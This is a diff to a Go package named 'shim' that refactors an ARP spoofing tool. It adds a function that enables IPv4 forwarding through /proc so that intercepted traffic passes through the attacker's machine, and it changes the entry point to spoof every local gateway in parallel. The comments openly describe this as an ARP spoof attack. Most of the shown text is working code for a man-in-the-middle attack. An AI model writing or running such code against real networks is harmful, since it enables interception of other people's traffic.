@@ -1,16 +1,16 @@
 package shim
 
 import (
+    "bufio"
+    "errors"
+    "io"
+    "log"
     "net"
     "os"
-    "io"
-    "bufio"
-    "strings"
     "strconv"
-    "log"
+    "strings"
     "time"
     "unsafe"
-    "errors"
     "github.com/mdlayher/arp"
 )
 
@@ -19,8 +19,29 @@ type Gateway struct {
     iface *net.Interface
 }
 
+func setIpForwarding(enabled bool) error {
+    f, err := os.Create("/proc/sys/net/ipv4/ip_forward")
+    if err != nil {
+        return err
+    }
+    defer f.Close()
+
+    var val byte = '0'
+    if enabled {
+        val = '1'
+    }
+
+    _, err = f.Write([]byte{val})
+    if err != nil {
+        return err
+    }
+
+    log.Printf("Set IP forwarding enabled -> %t\n", enabled)
+    return nil
+}
+
 // Reads the gateway routes on the local machine from procfs.
-func GetGateways() ([]Gateway, error) {
+func getGateways() ([]Gateway, error) {
     f, err := os.Open("/proc/net/route")
     if err != nil {
         return nil, err
@@ -83,7 +104,7 @@ func requestGatewayMAC(client *arp.Client, gateway Gateway) (net.HardwareAddr, e
     // Reset deadline when we exit
     defer client.SetDeadline(time.Time{})
 
-    for i := 0; i < tries; i += 1 {
+    for i := 0; i < tries; i++ {
         // Send ARP request packet for the gateway IP
         err := client.Request(gateway.ip)
         if err != nil {
@@ -201,15 +222,25 @@ func arpSpoof(gateway Gateway) error {
     }
 }
 
-// Starts an ARP spoof attack on all local gateways.
-// This does not block; the attacks run in the background.
-func StartArpSpoof() error {
-    gateways, err := GetGateways()
+// Runs an ARP spoof attack on all local gateways.
+// This blocks until the attack stops (which only
+// occurs on an error).
+func ArpSpoof() error {
+    err := setIpForwarding(true)
+    if err != nil {
+        log.Printf("Failed to enable IP forwarding: %s\n", err)
+        return err
+    }
+    defer setIpForwarding(false)
+
+    gateways, err := getGateways()
     if err != nil {
         log.Printf("Failed to find gateways: %s\n", err)
         return err
     }
 
+    // Run attacks in parallel
+    out := make(chan error)
     for _, gateway := range gateways {
         go func(gateway Gateway) {
             err := arpSpoof(gateway)
@@ -220,8 +251,18 @@ func StartArpSpoof() error {
                     err,
                 )
             }
+            out <- err
         }(gateway)
     }
 
-    return nil
+    // Wait for threads to finish. First error that occurs
+    // becomes our return value.
+    for i := 0; i < len(gateways); i++ {
+        tmp := <-out
+        if tmp != nil {
+            err = tmp
+        }
+    }
+
+    return err
 }
